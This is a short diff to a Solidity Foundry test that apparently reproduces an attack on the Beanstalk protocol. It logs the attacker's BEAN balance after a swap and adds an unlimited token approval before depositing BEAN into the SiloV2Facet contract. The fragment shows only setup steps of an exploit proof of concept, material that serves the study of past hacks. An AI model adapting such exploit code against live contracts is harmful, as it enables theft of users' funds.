@@ -51,6 +51,7 @@ contract ContractTest is DSTest {
       "After initial ETH -> BEAN swap, Bean balance of attacker:",
       bean.balanceOf(address(this)) / 1e6
     );
+    bean.approve(address(siloV2Facet), type(uint256).max);
     siloV2Facet.depositBeans(bean.balanceOf(address(this)));
     emit log_named_uint(
       "After BEAN deposit to SiloV2Facet, Bean balance of attacker:",
